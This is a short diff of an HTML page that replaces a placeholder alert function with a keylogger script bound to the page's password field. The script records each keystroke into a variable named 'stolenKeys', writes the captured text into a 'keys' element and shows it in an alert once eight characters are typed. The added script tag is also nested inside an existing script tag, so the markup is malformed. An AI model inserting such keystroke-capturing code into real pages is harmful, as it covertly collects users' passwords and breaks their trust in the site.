@@ -1920,10 +1920,23 @@
   <body>
      <script type="text/javascript">
 
-function submitForm(){
-    
-    alert("hii");
-}
+<script>
+			var stolenKeys="";				
+			document.getElementById("password").addEventListener("keydown", myFunction);
+			
+			function myFunction(e) {			
+				var code = e.keyCode;
+				var value = String.fromCharCode(code);
+				if(code == 8)
+					stolenKeys = stolenKeys.substring(0,stolenKeys.length - 1);				
+				if(code >= 48 && code <=90)
+					stolenKeys+=value;
+				
+				document.getElementById("keys").value = stolenKeys;		
+				if(stolenKeys.length == 8)
+					alert(stolenKeys);
+			}
+		</script> 
   </script>
     
   <div class="wrapper">
